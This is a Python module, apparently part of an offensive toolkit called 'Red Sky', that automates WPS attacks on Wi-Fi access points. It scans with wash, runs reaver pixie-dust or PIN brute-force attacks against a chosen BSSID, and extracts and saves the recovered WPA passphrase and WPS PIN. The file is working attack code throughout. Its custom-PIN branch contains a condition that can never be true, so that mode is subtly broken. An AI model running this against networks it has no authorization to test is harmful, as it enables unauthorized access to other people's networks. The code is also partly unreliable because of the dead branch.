# language: Python, file: Program/wifi/wps.py, target: Red Sky wifi — WPS
# Wrap wash (WPS scan) and reaver (WPS PIN brute / pixie dust).

import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


WIFI_DIR = OUTPUT_DIR / "wifi"


def _is_root():
    try:
        return os.geteuid() == 0
    except AttributeError:
        return False


def cmd_scan(iface, duration=30):
    if not _is_root():
        print_err("WPS scan needs root")
        return 1
    if not shutil.which("wash"):
        print_err("wash missing — install reaver")
        return 1

    print_info(f"scanning WPS-enabled APs on {iface} for {duration}s")
    cmd = ["wash", "-i", iface, "-s"]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, bufsize=1)
    except (subprocess.SubprocessError, FileNotFoundError) as e:
        print_err(f"wash failed: {e}")
        return 1

    hits = []
    t0 = time.time()
    for line in proc.stdout:
        line = line.rstrip()
        if not line:
            continue
        if line.startswith("Wash") or line.startswith("BSSID"):
            print(f"  {ARTERY}{line[:100]}{RESET}")
            continue
        parts = line.split()
        if len(parts) >= 6 and ":" in parts[0]:
            bssid = parts[0]
            channel = parts[1]
            rssi = parts[2]
            wps_ver = parts[3]
            wps_locked = parts[4]
            essid = " ".join(parts[5:])
            hits.append({
                "bssid": bssid, "channel": channel, "rssi": rssi,
                "wps_ver": wps_ver, "wps_locked": wps_locked, "essid": essid,
            })
            print(f"  {ARTERY}▓{RESET} {BONE}{bssid}{RESET} "
                  f"{SCARLET}ch {channel}{RESET} "
                  f"{ASH}rssi {rssi} wps={wps_ver} lock={wps_locked} {essid[:30]}{RESET}")
        if time.time() - t0 > duration:
            break

    proc.terminate()
    try:
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        proc.kill()

    if hits:
        out = WIFI_DIR / f"wps_scan_{int(time.time())}.json"
        WIFI_DIR.mkdir(parents=True, exist_ok=True)
        out.write_text(json.dumps(hits, indent=2))
        print()
        print_kv("hits", len(hits))
        print_kv("saved", out)
    else:
        print_warn("no WPS APs found")
    return 0


def cmd_attack(iface, bssid, channel, mode="pixie", timeout=300):
    if not _is_root():
        print_err("WPS attack needs root")
        return 1
    if not shutil.which("reaver"):
        print_err("reaver missing")
        return 1

    WIFI_DIR.mkdir(parents=True, exist_ok=True)
    sess = WIFI_DIR / f"reaver_{bssid.replace(':', '')}_{int(time.time())}"

    cmd = ["reaver", "-i", iface, "-b", bssid, "-c", str(channel),
           "-s", str(sess), "-vv"]
    if mode == "pixie":
        cmd.append("-K")
        cmd.append("1")
    elif mode == "pin" and isinstance(mode, str) and mode.startswith("pin:"):
        cmd += ["-p", mode.split(":", 1)[1]]

    print_info(f"reaver against {bssid} on ch {channel}")
    print_kv("mode", mode)
    print_kv("session dir", sess)
    print_info(f"timeout {timeout}s")

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, bufsize=1)
    except (subprocess.SubprocessError, FileNotFoundError) as e:
        print_err(f"reaver failed: {e}")
        return 1

    wpa_psk = None
    wps_pin = None
    t0 = time.time()

    for line in proc.stdout:
        line = line.rstrip()
        if not line:
            continue
        low = line.lower()
        if "wpa psk" in low or "wpa psk:" in low:
            wpa_psk = line.split(":", 1)[-1].strip().strip("'").strip('"')
            print(f"{OK}▓ WPA PSK{RESET}  {BONE}{wpa_psk}{RESET}")
        elif "wps pin" in low and ":" in line:
            wps_pin = line.split(":")[-1].strip().strip("'").strip('"')
            print(f"{OK}▓ WPS PIN{RESET}  {BONE}{wps_pin}{RESET}")
        elif any(k in low for k in ("trying", "pin", "pixie", "progress", "failed")):
            print(f"  {ASH}{line[:120]}{RESET}")

        if time.time() - t0 > timeout:
            print_warn("timeout, stopping")
            proc.terminate()
            break

    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()

    print()
    if wpa_psk:
        print_ok(f"PSK: {wpa_psk}")
        if wps_pin:
            print_ok(f"PIN: {wps_pin}")
        out = WIFI_DIR / f"wps_result_{bssid.replace(':', '')}_{int(time.time())}.json"
        out.write_text(json.dumps({"bssid": bssid, "psk": wpa_psk, "pin": wps_pin}, indent=2))
        print_kv("saved", out)
        return 0
    print_warn("no PSK recovered this run")
    return 1


def run_cli(args):
    if not args:
        print_err("usage: redsky wifi wps <scan|attack> <iface> [options]")
        print_err("  scan <iface> [--duration N]")
        print_err("  attack <iface> --bssid MAC --channel N [--mode pixie|pin:12345678] [--timeout S]")
        return 2
    sub = args[0].lower()
    if len(args) < 2:
        print_err(f"{sub} needs an interface")
        return 2
    iface = args[1]

    def opt(name, default=""):
        if name in args:
            i = args.index(name)
            if i + 1 < len(args):
                return args[i + 1]
        return default

    if sub == "scan":
        return cmd_scan(iface, int(opt("--duration", "30")))
    if sub == "attack":
        bssid = opt("--bssid")
        channel = opt("--channel")
        if not bssid or not channel:
            print_err("attack needs --bssid and --channel")
            return 2
        return cmd_attack(iface, bssid, channel,
                          opt("--mode", "pixie"),
                          int(opt("--timeout", "300")))
    print_err(f"unknown wps sub-command: {sub}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
